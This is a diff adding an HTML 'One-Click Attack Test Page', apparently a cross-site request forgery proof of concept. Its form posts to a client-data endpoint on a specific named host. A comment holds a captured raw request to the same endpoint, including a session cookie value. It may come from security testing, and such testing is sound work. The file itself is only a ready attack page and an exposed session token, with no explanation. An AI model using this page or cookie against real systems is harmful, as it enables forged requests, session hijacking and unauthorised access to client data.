@@ -1,0 +1,37 @@
+<html>
+<head><title>One-Click Attack Test Page</title></head>
+<body>
+
+<form action="https://qabiahphi.sandmansystems.com/index.php/input_module/input_sellout/fetch_clients_skus_data" method="POST">
+  <label for="distributor">distributor:</label>
+  <input type="text" id="distributor" name="distributor"><br><br>
+  <label for="subdistributor">subdistributor:</label>
+  <input type="text" id="subdistributor" name="subdistributor"><br><br>
+  <input type="submit" value="Submit">
+</form>
+
+</body>
+</html>
+
+<!--
+POST https://qabiahphi.sandmansystems.com/index.php/input_module/input_sellout/fetch_clients_skus_data HTTP/1.1
+Host: qabiahphi.sandmansystems.com
+Connection: keep-alive
+Content-Length: 31
+sec-ch-ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
+Accept: application/json, text/javascript, */*; q=0.01
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
+sec-ch-ua-platform: "Windows"
+Origin: https://qabiahphi.sandmansystems.com
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://qabiahphi.sandmansystems.com/index.php/input_module/input_sellout/display_input_module/
+Accept-Language: fil,fil-PH;q=0.9,tl;q=0.8,en-US;q=0.7,en;q=0.6
+Cookie: ci_session=60rj2ohgo56bse8e76gh02bf6vur9ulb
+
+distributor=1&subdistributor=27
+-->
